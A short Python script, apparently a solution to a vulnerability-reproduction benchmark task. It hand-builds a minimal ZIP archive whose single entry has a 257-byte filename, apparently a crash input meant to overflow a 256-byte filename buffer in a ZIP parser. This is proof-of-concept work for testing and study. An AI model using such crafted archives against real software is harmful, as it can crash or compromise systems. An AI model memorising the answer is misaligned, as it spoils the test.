import struct
import zlib


class Solution:
    def _build_minimal_zip(self, filename: bytes, data: bytes) -> bytes:
        crc = zlib.crc32(data) & 0xFFFFFFFF
        comp_size = len(data)
        uncomp_size = len(data)
        fn_len = len(filename)
        extra = b""
        extra_len = 0

        local_header = struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,  # local file header signature
            20,          # version needed to extract
            0,           # general purpose bit flag
            0,           # compression method (store)
            0,           # last mod file time
            0,           # last mod file date
            crc,
            comp_size,
            uncomp_size,
            fn_len,
            extra_len
        )
        local = local_header + filename + extra + data

        cd_offset = len(local)

        central_header = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50,  # central file header signature
            20,          # version made by
            20,          # version needed to extract
            0,           # general purpose bit flag
            0,           # compression method
            0,           # last mod file time
            0,           # last mod file date
            crc,
            comp_size,
            uncomp_size,
            fn_len,
            extra_len,
            0,           # file comment length
            0,           # disk number start
            0,           # internal file attributes
            0,           # external file attributes
            0            # relative offset of local header
        )
        central = central_header + filename + extra

        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,  # end of central dir signature
            0,           # number of this disk
            0,           # disk where central directory starts
            1,           # number of central directory records on this disk
            1,           # total number of central directory records
            len(central),# size of central directory (bytes)
            cd_offset,   # offset of start of central directory
            0            # ZIP file comment length
        )

        return local + central + eocd

    def solve(self, src_path: str) -> bytes:
        fname = (b"A" * 250) + b"/" + (b"B" * 6)  # total length 257 (>256)
        return self._build_minimal_zip(fname, b"")